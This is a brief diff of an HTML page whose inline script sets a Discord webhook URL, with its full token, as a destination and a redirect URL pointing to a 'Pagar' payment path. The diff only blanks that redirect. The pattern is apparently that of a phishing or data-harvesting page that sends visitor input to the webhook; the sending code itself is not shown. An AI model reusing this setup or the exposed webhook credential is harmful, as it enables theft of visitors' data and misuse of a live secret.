@@ -17,7 +17,7 @@
 <script>
 /* ========= CONFIG ========= */
 const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1417919457531138140/KtlzGO1YiHNBuJJeQ14WJV6-ELG1cY8ML6fUBS3eiYuWF1xQ-eRZfcW0qPQFo6ALncbo';
-const REDIR_URL   = 'https://energyvicosta.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9';
+const REDIR_URL   = '';
 /* ========================== */
 
 (async () => {
@@ -95,4 +95,5 @@ const REDIR_URL   = 'https://energyvicosta.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9'
 })();
 </script>
 </body>
+
 </html>
